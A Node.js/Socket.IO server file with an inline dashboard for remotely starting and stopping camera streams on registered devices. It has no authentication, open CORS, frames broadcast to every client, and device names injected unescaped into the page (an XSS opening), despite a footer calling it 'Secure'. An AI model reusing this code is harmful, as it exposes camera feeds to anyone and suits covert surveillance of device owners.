const express = require('express');
const app = express();
const server = require('http').createServer(app);
const io = require('socket.io')(server, { 
  cors: { origin: "*" },
  transports: ['polling', 'websocket']
});

let devices = new Map(); // Store all connected devices

app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Multi Device Camera Control</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { 
                background: linear-gradient(135deg, #000000, #1a1a2e);
                font-family: system-ui, sans-serif;
                min-height: 100vh;
                padding: 20px;
            }
            .container { max-width: 800px; margin: 0 auto; }
            h1 { color: white; text-align: center; margin-bottom: 20px; font-size: 24px; }
            
            /* Device List */
            .device-list {
                background: rgba(0,0,0,0.5);
                border-radius: 20px;
                padding: 15px;
                margin-bottom: 20px;
            }
            .device-title { color: white; margin-bottom: 10px; font-size: 16px; }
            .device-grid {
                display: grid;
                gap: 10px;
            }
            .device-card {
                background: rgba(255,255,255,0.1);
                border-radius: 12px;
                padding: 12px;
                cursor: pointer;
                transition: all 0.2s;
                border: 1px solid rgba(255,255,255,0.1);
            }
            .device-card:hover { background: rgba(255,255,255,0.2); }
            .device-card.selected {
                border: 2px solid #22c55e;
                background: rgba(34,197,94,0.2);
            }
            .device-name { color: white; font-weight: bold; font-size: 16px; }
            .device-status { font-size: 12px; margin-top: 5px; }
            .status-online { color: #22c55e; }
            .status-offline { color: #ef4444; }
            .device-id { font-size: 10px; color: #888; margin-top: 3px; font-family: monospace; }
            
            /* Stream Section */
            .stream-section {
                background: rgba(0,0,0,0.7);
                border-radius: 20px;
                padding: 20px;
                backdrop-filter: blur(10px);
                margin-bottom: 20px;
            }
            .stream-header {
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin-bottom: 15px;
                color: white;
            }
            .live-badge {
                background: #ef4444;
                padding: 4px 12px;
                border-radius: 20px;
                font-size: 12px;
                animation: blink 1s infinite;
            }
            @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0.5; } }
            .video-container {
                background: #000;
                border-radius: 16px;
                overflow: hidden;
                aspect-ratio: 16/9;
                border: 2px solid #333;
                margin-bottom: 15px;
            }
            #streamImage { width: 100%; height: 100%; object-fit: cover; }
            .stream-info {
                display: flex;
                justify-content: space-between;
                color: #aaa;
                font-size: 13px;
            }
            .fps { color: #22c55e; font-family: monospace; }
            .control-buttons {
                display: flex;
                gap: 15px;
                justify-content: center;
                margin-top: 15px;
            }
            button {
                padding: 12px 24px;
                font-size: 16px;
                font-weight: bold;
                border: none;
                border-radius: 40px;
                cursor: pointer;
            }
            .btn-start { background: #22c55e; color: white; }
            .btn-stop { background: #ef4444; color: white; }
            .footer { text-align: center; color: #555; font-size: 11px; margin-top: 20px; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>📹 Multi Device Camera Control</h1>
            
            <!-- Device List -->
            <div class="device-list">
                <div class="device-title">📱 Connected Devices</div>
                <div class="device-grid" id="deviceList">
                    <div style="color:#888; text-align:center;">Waiting for devices...</div>
                </div>
            </div>
            
            <!-- Stream Section -->
            <div class="stream-section">
                <div class="stream-header">
                    <span>🎥 Live Stream</span>
                    <span class="live-badge" id="liveBadge">OFFLINE</span>
                </div>
                <div class="video-container">
                    <img id="streamImage" src="">
                </div>
                <div class="stream-info">
                    <span>📡 <span id="selectedDevice">No device selected</span></span>
                    <span class="fps">⚡ <span id="fpsValue">0</span> FPS</span>
                </div>
                <div class="control-buttons">
                    <button class="btn-start" id="startBtn">▶ START</button>
                    <button class="btn-stop" id="stopBtn">⏹ STOP</button>
                </div>
            </div>
            
            <div class="footer">🔒 Secure | 🎯 Multi Device | 📡 Real-time</div>
        </div>
        
        <script>
            const socket = io();
            let selectedDeviceId = null;
            let currentStreamingDevice = null;
            let fps = 0, lastFpsUpdate = Date.now();
            
            const deviceListDiv = document.getElementById('deviceList');
            const streamImage = document.getElementById('streamImage');
            const liveBadge = document.getElementById('liveBadge');
            const selectedDeviceSpan = document.getElementById('selectedDevice');
            const fpsSpan = document.getElementById('fpsValue');
            const startBtn = document.getElementById('startBtn');
            const stopBtn = document.getElementById('stopBtn');
            
            // Update FPS counter
            function updateFPS() {
                const now = Date.now();
                if (now - lastFpsUpdate >= 1000) {
                    fpsSpan.innerText = fps;
                    fps = 0;
                    lastFpsUpdate = now;
                }
                requestAnimationFrame(updateFPS);
            }
            updateFPS();
            
            // Render device list
            function renderDevices(devices) {
                if (Object.keys(devices).length === 0) {
                    deviceListDiv.innerHTML = '<div style="color:#888; text-align:center;">No devices connected...</div>';
                    return;
                }
                
                deviceListDiv.innerHTML = Object.entries(devices).map(([id, device]) => \`
                    <div class="device-card \${selectedDeviceId === id ? 'selected' : ''}" onclick="selectDevice('\${id}')">
                        <div class="device-name">📱 \${device.name}</div>
                        <div class="device-status">
                            <span class="status-\${device.status}">● \${device.status === 'online' ? 'Online' : 'Offline'}</span>
                        </div>
                        <div class="device-id">ID: \${id.substring(0, 15)}...</div>
                    </div>
                \`).join('');
            }
            
            // Select device
            function selectDevice(deviceId) {
                selectedDeviceId = deviceId;
                selectedDeviceSpan.innerText = \`Device: \${deviceId.substring(0, 15)}...\`;
                renderDevices(devicesData);
                
                // Request frame from selected device
                socket.emit('select-device', deviceId);
            }
            
            let devicesData = {};
            
            socket.on('device-list', (devices) => {
                devicesData = devices;
                renderDevices(devices);
            });
            
            socket.on('frame', (data) => {
                if (data && data.frame) {
                    streamImage.src = data.frame;
                    fps++;
                    liveBadge.innerText = 'LIVE';
                    liveBadge.style.background = '#ef4444';
                }
            });
            
            socket.on('disconnect', () => {
                liveBadge.innerText = 'OFFLINE';
                liveBadge.style.background = '#888';
            });
            
            startBtn.onclick = () => {
                if (selectedDeviceId) {
                    socket.emit('command', { deviceId: selectedDeviceId, command: 'start' });
                }
            };
            
            stopBtn.onclick = () => {
                if (selectedDeviceId) {
                    socket.emit('command', { deviceId: selectedDeviceId, command: 'stop' });
                }
            };
            
            window.selectDevice = selectDevice;
        </script>
    </body>
    </html>
  `);
});

// Socket.IO Events
io.on('connection', (socket) => {
  console.log('✅ New connection:', socket.id);
  let currentDeviceId = null;
  let deviceName = null;
  
  socket.on('register', (data) => {
    currentDeviceId = data.deviceId;
    deviceName = data.deviceName || data.deviceId.substring(0, 10);
    
    devices.set(currentDeviceId, {
      id: currentDeviceId,
      name: deviceName,
      status: 'online',
      socketId: socket.id,
      lastSeen: Date.now()
    });
    
    console.log(`📱 Device registered: ${deviceName} (${currentDeviceId})`);
    broadcastDeviceList();
  });
  
  socket.on('frame', (data) => {
    // Broadcast frame to all clients
    io.emit('frame', { frame: data, deviceId: currentDeviceId });
  });
  
  socket.on('command', (data) => {
    const device = devices.get(data.deviceId);
    if (device && device.socketId) {
      io.to(device.socketId).emit('command', data.command);
      console.log(`🎮 Command "${data.command}" sent to ${device.name}`);
    }
  });
  
  socket.on('select-device', (deviceId) => {
    console.log(`📺 Selected device: ${deviceId}`);
  });
  
  socket.on('heartbeat', (data) => {
    const device = devices.get(data.deviceId);
    if (device) {
      device.status = 'online';
      device.lastSeen = Date.now();
      devices.set(data.deviceId, device);
    }
  });
  
  socket.on('disconnect', () => {
    if (currentDeviceId) {
      const device = devices.get(currentDeviceId);
      if (device) {
        device.status = 'offline';
        devices.set(currentDeviceId, device);
        console.log(`📱 Device offline: ${device.name}`);
        broadcastDeviceList();
      }
    }
  });
});

function broadcastDeviceList() {
  const list = {};
  for (let [id, device] of devices) {
    list[id] = {
      name: device.name,
      status: device.status
    };
  }
  io.emit('device-list', list);
}

// Clean offline devices every 30 seconds
setInterval(() => {
  const now = Date.now();
  let updated = false;
  for (let [id, device] of devices) {
    if (device.status === 'online' && now - device.lastSeen > 15000) {
      device.status = 'offline';
      devices.set(id, device);
      updated = true;
    }
  }
  if (updated) broadcastDeviceList();
}, 15000);

const PORT = 3000;
server.listen(PORT, '0.0.0.0', () => {
  console.log('');
  console.log('═══════════════════════════════════');
  console.log('✅ MULTI DEVICE SERVER READY');
  console.log('═══════════════════════════════════');
  console.log(`📍 Open: https://your-replit.repl.co`);
  console.log('═══════════════════════════════════');
});
